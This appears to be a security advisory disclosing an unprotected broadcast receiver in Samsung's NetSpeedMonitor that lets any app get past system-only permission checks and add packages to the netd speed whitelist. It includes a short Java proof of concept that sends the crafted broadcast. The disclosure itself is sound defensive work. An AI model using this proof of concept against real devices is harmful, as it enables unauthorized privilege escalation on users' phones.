# Description

Oversecured found an unprotected dynamically registered receiver in the `com/android/server/ibs/dnba/NetSpeedMonitor.java` file. It handled `com.samsung.android.game.gos.GAME_INFO` actions and passed the `packageName` value to the `NetworkManagementService` to add an app to the netd speed whitelist. The attacker couldn't call methods of this service directly, because they are protected by system-only permissions. But with the help of this receiver, the attacker could bypass the checks.

**Proof of Concept**
```java
Intent i = new Intent("com.samsung.android.game.gos.GAME_INFO");
i.putExtra("packageName", "com.android.settings");
i.putExtra("uid", 1000);
i.putExtra("dnbaSwitch", false);
sendBroadcast(i);
```
